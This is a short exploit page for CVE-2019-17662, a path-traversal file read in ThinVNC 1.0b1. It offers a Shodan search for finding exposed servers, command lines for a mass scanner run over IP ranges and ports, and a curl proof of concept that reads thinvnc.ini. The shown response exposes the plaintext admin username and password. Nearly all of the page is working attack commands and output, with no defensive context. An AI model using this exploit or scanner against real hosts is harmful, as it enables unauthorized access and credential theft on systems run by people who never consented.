## CVE-2019-17662
![](https://img.shields.io/static/v1?label=Product&message=ThinVNC&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=1.0b1&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Arbitrary%20File%20Read&color=red)


- Shodan dork:
```
"ThinVNC"
```
or
```
pip install argparse colorama
```
```
python scanner.py file_list_ip_cidr 80 -o results.txt
```
```
python scanner.py file_list_ip_cidr 80, 8080-8090 -o results.txt
```
```
python scanner.py 192.168.1.1/24 80,8080-8090 -o results.txt
```
- POC:
```
curl -k -X 'GET' "http://target_ip_address:port/a/\../\../thinvnc.ini"
	  
Response:
[Authentication]
Unicode=0
User=admin
Password=admin
Type=Digest
[Http]
Port=8080
Enabled=1
[Tcp]
Port=
[General]
AutoStart=1
```
